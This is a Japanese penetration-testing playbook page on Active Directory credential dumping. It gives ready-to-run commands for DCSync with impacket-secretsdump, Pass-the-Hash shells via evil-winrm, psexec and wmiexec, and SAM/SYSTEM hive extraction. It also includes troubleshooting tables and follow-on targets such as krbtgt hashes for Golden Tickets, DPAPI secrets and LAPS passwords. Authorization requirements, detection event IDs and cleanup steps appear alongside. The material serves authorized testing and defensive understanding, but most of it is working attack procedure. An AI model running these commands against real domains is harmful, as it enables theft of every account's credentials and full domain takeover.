# 認証情報のダンプ（DCSync / Pass-The-Hash）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（取得した krbtgt ハッシュは Golden Ticket に直結）
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Event ID 4662 + DRSUAPI レプリケーションコール、LSASS dump は Defender for Endpoint 等で確実に検知）
>
> 実施可否は事前合意で明示確認すること。取得情報の暗号化保管・テスト完了後破棄ポリシーが必須。演習環境（HTB / OSCP 等）では制約なし。

> **スコープ**: DCSync 権限または DA 権限取得後のハッシュ取得 → Pass-The-Hash でのアクセス確立まで。権限取得の手法は `Delegation_Attacks/` `ACE_Abuse/` を参照。

## 着火条件

以下のいずれかで DCSync 権限またはローカル管理者権限がある場合：
- Domain Admins メンバー
- `DS-Replication-Get-Changes` と `DS-Replication-Get-Changes-All` 権限を持つアカウント
- RBCD / Unconstrained Delegation で取得した DC$ の TGT（Kerberos 認証で使用）
- ローカルサーバー / ワークステーションでの管理者権限（SAM/SYSTEM ハイブ取得用）

## 環境前提

- 実行環境: テスター端末（Linux）
- 必要なツール:
  - `impacket-secretsdump`（`impacket` スイート、ペネトレ用 Linux ディストリ標準搭載）
  - `evil-winrm`（ペネトレ用 Linux ディストリ標準搭載）
  - `netexec`（`nxc`、ペネトレ用 Linux ディストリ標準搭載）
- オフライン代替: `-sam/-system LOCAL` モードはネットワーク不要。ターゲットから先にハイブをコピーしておけば完全オフライン解析が可能

---

## 1. DCSync で全ハッシュを取得

**攻撃者の思考トレース**: DCSync は「DC が他の DC にハッシュを複製する」正規プロトコル（DRSUAPI）を模倣する手法。DA 権限または複製権限があれば任意ユーザーのハッシュを取得できる。`-just-dc-ntlm` を付けないと NTDS.dit 全体（膨大）が出力されるため必ず付ける。

**コマンド:**

```bash
# [Attacker] パスワード認証で実行
impacket-secretsdump \
  -just-dc-ntlm \
  '[DOMAIN]/[USER]:[PASSWORD]@[DC_FQDN]'

# [Attacker] NTLM ハッシュで実行（Pass-The-Hash）
impacket-secretsdump \
  -hashes :[NTLM_HASH] \
  -just-dc-ntlm \
  '[DOMAIN]/Administrator@[DC_FQDN]'

# [Attacker] Kerberos チケットで実行
export KRB5CCNAME=/path/to/ticket.ccache
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  'administrator@[DC_FQDN]'
```

**観測される出力 → 次のアクション:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[USER]:1104:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
```

- フィールド順: `ユーザー名:RID:LMハッシュ:NTLMハッシュ`
- `aad3b435b51404eeaad3b435b51404ee` は空の LM ハッシュ（現代の環境では常にこれ）
- **NTLM ハッシュ部分（4番目フィールド）** を §2 Pass-The-Hash で使用する

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| ハッシュが複数行出力された | DCSync 成功。krbtgt も取得できているか確認 | §2 Pass-The-Hash で管理者アクセスを確立 |
| `KRB_AP_ERR_SKEW` エラー | 時刻のずれ | `sudo ntpdate [DC_IP]` で同期してから再試行 |
| `Access denied` | DCSync 権限が付与されていない | `BloodHound.md` で実際の権限を再確認 |

**注意:** 出力は必ずファイルにリダイレクトして保存する（`2>&1 | tee dump.txt`）。krbtgt ハッシュは Golden Ticket 攻撃で使用できるため別途記録する。

---

## 2. Pass-The-Hash でアクセスを確立

**攻撃者の思考トレース**: NTLM 認証はパスワードの代わりにハッシュを直接受け付ける。DCSync や SAM dump で取得した Administrator の NTLM ハッシュをそのまま使ってシェルまたは SMB アクセスを確立する。

**コマンド:**

```bash
# [Attacker] WinRM（evil-winrm）- シェル取得に最適
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'

# [Attacker] SMB（smbclient）- ファイルアクセス
smbclient //[DC_IP]/C$ -U '[DOMAIN]\Administrator' --pw-nt-hash '[NTLM_HASH]'

# [Attacker] SMB 経由でコマンド実行（impacket）
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-smbexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `*Evil-WinRM* PS C:\Users\Administrator>` | WinRM 接続成功 | `whoami /all` で権限確認 → 横展開観点を確認 |
| `(Pwn3d!)` （netexec での確認時） | SMB アクセス成功 | impacket-psexec / smbclient で操作 |
| `NT_STATUS_LOGON_FAILURE` | ハッシュが間違い or 無効 | DCSync 出力を再確認してハッシュが正しいか確認 |
| `NT_STATUS_ACCESS_DENIED` | ユーザーが WinRM/SMB にアクセス権なし | 別のアカウントのハッシュを試す |

**注意:** Pass-The-Hash の利用は Event ID 4624 Type 3（NTLM）で記録される。

---

## 3. SAM/SYSTEM ハイブからハッシュを取得（ローカル）

DC 以外のメンバーサーバーやワークステーションでローカル管理者のハッシュを取得する。

**コマンド:**

```powershell
# [Target] レジストリからSAMとSYSTEMをバックアップ
reg save HKLM\SAM     C:\Temp\sam.hive     /y
reg save HKLM\SYSTEM  C:\Temp\system.hive  /y
```

**事前準備（必須）:** 上記で取得したファイルをテスター端末にダウンロードしてから解析する。

```bash
# [Attacker] テスター端末でオフライン解析
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `Administrator:500:...[NTLM_HASH]:::` | ローカル管理者の NTLM ハッシュ | §2 Pass-The-Hash でこのホストに管理者アクセス確立 |
| `$DCC2$...` エントリ | キャッシュドドメインクレデンシャル | hashcat `-m 2100` でクラック（時間がかかる） |
| LSA Secrets セクション | サービスアカウントのパスワード | 取得した平文パスワードで他サービスに認証 |

**注意:** `C:\Temp` への書き込み権限があるか先に確認する（`echo test > C:\Temp\test.txt`）。

---

## 刺さらなかったとき

| 現象 | 原因 | 代替 |
|------|------|------|
| `DRSUAPI SessionError: ERR_DS_COULDNT_CONTACT_FSMO` | DC への到達不可 / FQDN の解決失敗 | `/etc/hosts` に DC の FQDN を追加してから再試行 |
| `KRB_AP_ERR_SKEW` | 時刻のずれ | `sudo ntpdate [DC_IP]` で同期 |
| Kerberos チケットで `Access denied` | チケットの SPN と接続先が不一致 | `-target-ip [DC_IP]` を明示する |
| `reg save` が `Access denied` | ローカル管理者権限なし | SeBackupPrivilege がある場合は `Privilege_Tokens.md` の SeBackup セクションを参照 |
| ハッシュで WinRM 接続できない | WinRM が無効 or アクセスリスト制限 | SMB 経由の impacket-psexec / wmiexec を試す |

---

## 注意点・落とし穴

- **`-just-dc-ntlm` を忘れない**: 付けないと NTDS.dit の全内容（非常に大量）が出力される
- **出力は必ずファイルに保存**: `tee dump.txt` でリダイレクトし、作業後に暗号化コンテナへ移動する
- **krbtgt ハッシュは特別扱い**: Golden Ticket に直結するため、取得後は対象組織に「krbtgt パスワードの2回ローテーション」を依頼する事項をレポートに記載する

---

## 昇格成功後に確認すること（横展開観点）

「DCSync で krbtgt を取得できた = ゴール」ではない。

- **krbtgt ハッシュ** → Golden Ticket 作成可能（事前合意がない限り原則作成しない）。対象組織へ「krbtgt パスワードの2回ローテーション」依頼をレポートに記載
- **Domain Admin / Enterprise Admin の NTLM ハッシュ** → Pass-The-Hash でドメイン内任意ホストへ接続性確認
- **全ユーザーの NTLM ハッシュ** → hashcat でクラック → パスワード強度・使い回し状況の評価レポート用途
- **サービスアカウントの NTLM ハッシュ** → SPN 付きアカウント・Linux 側 sssd 連携アカウントへの横展開
- **マシンアカウントのハッシュ** → そのホストでのローカル管理者操作・Silver Ticket 作成可否
- **SAM/LSA dump（メンバーサーバー側）取得時** → ローカル管理者ハッシュ → ドメイン内他ホストへの Pass-The-Hash 試行（同一ローカル管理者パスワード使い回し検出）
- **保存資格情報（DPAPI / Credential Manager）** → クラウド・SaaS・サードパーティへの横展開経路
- **LAPS の `ms-Mcs-AdmPwd` 属性** → 各ホストのローカル管理者パスワード

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。DCSync はドメイン全体の認証情報取得に直結する最重要操作
- **想定されるSIEM/EDR検知**:
  - Event ID 4662（オブジェクトへのアクセス）+ DRSUAPI のレプリケーション RPC 呼び出し
  - Microsoft ATA/Defender for Identity の DCSync アラート（`DS-Replication-Get-Changes-All` 権限行使を検知）
  - LSASS プロセスへのアクセス → Defender for Endpoint / EDR の挙動検知
  - Pass-The-Hash 利用は Event ID 4624 Type 3（NTLM）で検知
  - **Sysmon Event ID 10（ProcessAccess to lsass.exe）**: procdump / Mimikatz がLSASSにアクセスする際に記録。GrantedAccess `0x1010` / `0x1410` / `0x143A` などが SIEM 検知クエリの対象
  - **EDR アラート名（例）**: Defender for Endpoint「Credential dumping」、CrowdStrike「OS Credential Dumping: LSASS Memory」
- **業務影響リスク**: なし（参照のみで業務影響は出ないが、ダンプ操作自体が高優先度のインシデントとして扱われる）
- **原状回復必須項目**:
  - ✅ DCSync 用に付与した複製権限（`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`）の削除
  - ✅ ダンプしたハッシュファイル・SAM/SYSTEM ハイブの暗号化保管 → テスト完了時破棄
  - ✅ krbtgt 取得時は対象組織へ「krbtgt パスワードの2回ローテーション」を依頼
  - ✅ レジストリエクスポート時に作成した一時ファイル（`C:\Temp\sam.hive` 等）の削除
- **取得情報の取扱**: 全 NTLM ハッシュ・krbtgt ハッシュは暗号化保管、アクセスログ管理、テスト完了時破棄。対象組織との書面合意必須
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：RBCD で Admin TGS を取得 → `./Delegation_Attacks/RBCD.md`
- 前：Unconstrained Delegation で DC$ TGT を取得 → `./Delegation_Attacks/Unconstrained.md`
- 後：取得したチケットの使用方法 → `./Kerberos_Attacks/Pass_The_Ticket.md`
- 後：取得したハッシュ・パスワードの使い回し確認 → `../02_Initial_Access/Credential_Discovery.md`
- 後：ハッシュクラック → `../05_Tools_Reference/Hashcat.md`
- 後：LAPS 値の取得 → `./LAPS_Dump.md`
